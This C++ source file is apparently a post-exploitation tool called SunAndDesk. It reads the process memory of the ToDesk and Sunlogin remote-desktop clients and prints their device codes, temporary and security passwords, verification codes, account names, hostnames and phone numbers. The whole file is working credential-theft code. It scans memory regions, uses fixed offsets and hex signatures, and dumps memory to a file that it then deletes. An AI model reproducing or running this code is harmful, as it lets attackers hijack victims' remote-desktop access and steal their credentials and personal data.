#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdio> 
#include <windows.h>
#include <tlhelp32.h>
#include <chrono>
#include <iomanip>         
#include <ctime>           
#include <sstream>


//获取设备码
void ExtractValue(HANDLE hProcess, LPCVOID address) {
    // 偏移 32 字节
    LPCVOID offsetAddress = (void*)((char*)address + 0x20);

    // 读取偏移地址处的内容（假设目标值为 9 字节）
    std::vector<unsigned char> buffer(9);
    SIZE_T bytesRead;

    ReadProcessMemory(hProcess, offsetAddress, buffer.data(), buffer.size(), &bytesRead);

    // 转换为字符串并打印
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk 设备码: " << extractedValue << std::endl;
}
//获取临时密码
void ExtractName(HANDLE hProcess, LPCVOID address) {
    // 偏移 224 字节
    LPCVOID offsetAddress = (void*)((char*)address - 224);

    // 读取偏移地址处的内容（假设目标值为 9 字节）
    std::vector<unsigned char> buffer(8);
    SIZE_T bytesRead;

    ReadProcessMemory(hProcess, offsetAddress, buffer.data(), buffer.size(), &bytesRead);

    // 转换为字符串并打印
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk 临时密码: " << extractedValue << std::endl;
}
//获取安全密码
void ExtractSafe(HANDLE hProcess, LPCVOID address) {
    // 偏移 224 字节
    LPCVOID offsetAddress = (void*)((char*)address - 192);
    // 创建一个动态大小的缓冲区用于读取数据
    std::vector<unsigned char> buffer;
    SIZE_T bytesRead;
    unsigned char byte;
    // 不断读取内存，直到遇到 0x00 字节
    while (true) {
        // 读取一个字节
        if (!ReadProcessMemory(hProcess, offsetAddress, &byte, sizeof(byte), &bytesRead) || bytesRead != sizeof(byte)) {
            std::cerr << "读取内存失败!" << std::endl;
            break;
        }
        // 如果遇到 0x00 字节，则停止读取
        if (byte == 0x00) {
            break;
        }
        // 将字节追加到缓冲区
        buffer.push_back(byte);

        // 更新偏移地址，继续读取下一个字节
        offsetAddress = (void*)((char*)offsetAddress + 1);
    }
    // 转换为字符串并打印
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk 安全密码: " << extractedValue << std::endl;
}
//获取电话号码
void ExtractPhone(HANDLE hProcess, LPCVOID address) {
    // 偏移 224 字节
    LPCVOID offsetAddress = (void*)((char*)address + 544);

    // 读取偏移地址处的内容（假设目标值为 9 字节）
    std::vector<unsigned char> buffer(11);
    SIZE_T bytesRead;

    ReadProcessMemory(hProcess, offsetAddress, buffer.data(), buffer.size(), &bytesRead);

    // 转换为字符串并打印
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk 登录者电话: " << extractedValue << std::endl;
}
//获取地址偏移量
BOOL ProcessMemory(HANDLE hProcess, LPCVOID address, SIZE_T size, const std::string& targetDate) {
    std::vector<unsigned char> buffer(size);
    SIZE_T bytesRead;

    // 读取内存
    ReadProcessMemory(hProcess, address, buffer.data(), size, &bytesRead);

    // 在读取的内存中查找目标日期
    std::string memString(buffer.begin(), buffer.begin() + bytesRead);

    size_t foundPos = memString.find(targetDate);
    if (foundPos != std::string::npos) {
        LPCVOID foundAddress = (void*)((char*)address + foundPos);
        std::cout << "[+] ToDesk " << std::endl << std::endl;
        // 提取偏移后的值
        ExtractValue(hProcess, foundAddress);
        // 提取偏移后临时密码
        ExtractName(hProcess, foundAddress);
        //获取安全密码
        ExtractSafe(hProcess, foundAddress);
        //获取电话
        ExtractPhone(hProcess, foundAddress);
        return true;
    }
    return false;
}
//获取当前日期
std::string GetCurrentDate() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    std::tm tm;
    localtime_s(&tm, &time);

    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y%m%d");
    return oss.str();
}

// 将十六进制字符串转换为字节数组
std::vector<unsigned char> HexStringToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        unsigned char byte = static_cast<unsigned char>(std::stoi(hex.substr(i, 2), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}
// 在文件中搜索匹配的字节模式
size_t FindPatternInFile(const std::string& filePath, const std::vector<unsigned char>& pattern) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return std::string::npos;
    }

    // 逐字节读取文件数据进行匹配
    std::vector<unsigned char> buffer(pattern.size());
    size_t offset = 0;
    while (file.read(reinterpret_cast<char*>(buffer.data()), pattern.size())) {
        if (std::equal(buffer.begin(), buffer.end(), pattern.begin())) {
            return offset;
        }
        offset++;
        file.seekg(offset, std::ios::beg); // 回到下一个位置继续检查
    }

    return std::string::npos;
}
// 提取并打印模式之间的 ASCII 数据
void ExtractAndPrintAscii(const std::string& filePath, size_t startOffset, size_t endOffset) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return;
    }

    // 移动到起始偏移位置
    file.seekg(startOffset, std::ios::beg);

    // 计算数据大小
    size_t dataSize = endOffset - startOffset;
    std::vector<unsigned char> data(dataSize);

    // 读取数据
    file.read(reinterpret_cast<char*>(data.data()), dataSize);

    // 打印数据为 ASCII
    for (unsigned char byte : data) {
        if (std::isprint(byte)) {
            std::cout << byte; // 打印可见字符
        }
        else {
            std::cout << '.'; // 不可见字符替换为 '.'
        }
    }
}
// 读取进程内存并保存到文件
bool CreateMemoryDump(HANDLE hProcess, const std::string& dumpFilePath) {
    std::ofstream dumpFile(dumpFilePath, std::ios::binary);
    if (!dumpFile.is_open()) {
        std::cerr << "Failed to open dump file: " << dumpFilePath << std::endl;
        return false;
    }

    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = 0;
    SIZE_T bytesRead;

    // 遍历进程内存区域
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && mbi.Protect != PAGE_GUARD) {
            std::vector<unsigned char> buffer(mbi.RegionSize);
            if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead)) {
                dumpFile.write(reinterpret_cast<const char*>(buffer.data()), bytesRead);
            }
        }
        address = (LPCVOID)((char*)mbi.BaseAddress + mbi.RegionSize);
    }

    dumpFile.close();
    std::cout << "Memory dump created at: " << dumpFilePath << std::endl;
    return true;
}
// 获取进程的 PID
DWORD GetConsoleProcessID(const std::wstring& targetProcessName) {
    // 创建快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create snapshot. Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    DWORD consoleSessionID = WTSGetActiveConsoleSessionId();

    // 遍历进程列表
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // 检查进程名称是否匹配
            if (_wcsicmp(pe32.szExeFile, targetProcessName.c_str()) == 0) {
                // 获取进程的 Session ID
                DWORD sessionID = 0;
                ProcessIdToSessionId(pe32.th32ProcessID, &sessionID);

                // 匹配运行在 Console 的进程
                if (sessionID == consoleSessionID) {
                    std::wcout << L"Found console process: " << targetProcessName
                        << L" (PID: " << pe32.th32ProcessID << L")" << std::endl;

                    CloseHandle(hSnapshot);
                    return pe32.th32ProcessID; // 返回 PID
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0; // 未找到匹配的进程
}

void PrintUserId(std::string dumpFilePath) {
    std::string startPatternHex = "00406D6D0A2A02000001010A092273656374696F6E22203A2022";
    std::string endPatternHex = "222C0A092276616C756522203A202230220A7D0A0000000100000000000000CF4CA1136C49";

    // 转换十六进制模式到字节数组
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // 在文件中查找模式
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
       /* std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // 提取并打印中间值
        std::cout << "[+] 用户账户: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintHostname(std::string dumpFilePath) {
    std::string startPatternHex = "008665B3142A0200924C4F474F4E5345525645523D5C5C";
    std::string endPatternHex = "00000000000000000000008565B4142A03008E4F6E654472697665";

    // 转换十六进制模式到字节数组
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // 在文件中查找模式
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
        /*std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // 提取并打印中间值
        std::cout << "[+] 机器名称: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintConsole(std::string dumpFilePath) {
    std::string startPatternHex = "22637572737461747573222000000000000000000F000000000000006B";
    std::string endPatternHex = "0A0909220B000000000000000F00000000000000002266617374636F646522";

    // 转换十六进制模式到字节数组
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // 在文件中查找模式
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
       /* std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // 提取并打印中间值
        std::cout << "[+] 设备识别码: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintCheckCode(std::string dumpFilePath) {
    std::string startPatternHex = "6034700A2A0200003C6620663D79616865692E323820633D636F6C6F725F65646974203E";
    std::string endPatternHex = "3C2F663E000028258247F67F0000C56EEE150063";

    // 转换十六进制模式到字节数组
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // 在文件中查找模式
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
        /*std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // 提取并打印中间值
        std::cout << "[+] 设备验证码: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintPhone(std::string dumpFilePath) {
    std::string startPatternHex = "3C2F646174613E3C6461746120747970653D226669656C6422206E616D653D226D6F62696C65223E";
    std::string endPatternHex = "3C2F646174613E3C6461746120747970653D226669656C6422206E616D653D22656D61696C223E";

    // 转换十六进制模式到字节数组
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // 在文件中查找模式
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
        /*std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // 提取并打印中间值
        std::cout << "[+] 登录用户电话 : "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}

int Sunlon() {
    // 输入目标进程名称
    std::wstring processName = L"SunloginClient.exe"; // 替换为目标进程名
    std::string dumpFilePath = "process_dump.bin";   // 本地 Dump 文件路径
    // 获取目标进程的 PID
    DWORD pid = GetConsoleProcessID(processName);
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    // 创建内存转储文件
    CreateMemoryDump(hProcess, dumpFilePath);
    std::cout << "[+] 向日葵 " << std::endl << std::endl;
    //打印用户账户
    PrintUserId(dumpFilePath);
    //打印主机名
    PrintHostname(dumpFilePath);
    //打印设备码
    PrintConsole(dumpFilePath);
    //打印验证码
    PrintCheckCode(dumpFilePath);
    //打印电话号码
    PrintPhone(dumpFilePath);
    remove(dumpFilePath.c_str());
    std::cout << "File '" << dumpFilePath << "' has been deleted successfully." << std::endl;
    CloseHandle(hProcess);
    return 0;
}

int ToDesk() {
    DWORD pid;

    std::wstring targetProcessName = L"ToDesk.exe";

    pid = GetConsoleProcessID(targetProcessName);

    std::string targetDate = GetCurrentDate();

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);

    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = 0;
    BOOL check;
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && mbi.Protect != PAGE_GUARD) {
            check =  ProcessMemory(hProcess, mbi.BaseAddress, mbi.RegionSize, targetDate);
            if (check)
            {
                CloseHandle(hProcess);
                system("pause");
                return 0;
            }
        }
        address = (LPCVOID)((char*)mbi.BaseAddress + mbi.RegionSize);
    }

    CloseHandle(hProcess);
    system("pause");
    return 0;
}

int main(int argc, char* argv[]) {
      
    if (argc < 2) {
        std::cout << "Dump use ---> SunAndDesk.exe <Sunlon>( or )<ToDesk>" << std::endl;
        return 1;
    }
    std::string opertor = argv[1];
    if (opertor == "Sunlon") {
        Sunlon();
    }
    else if (opertor == "ToDesk") {
        ToDesk();
    }
    system("pause");
    return 0;
}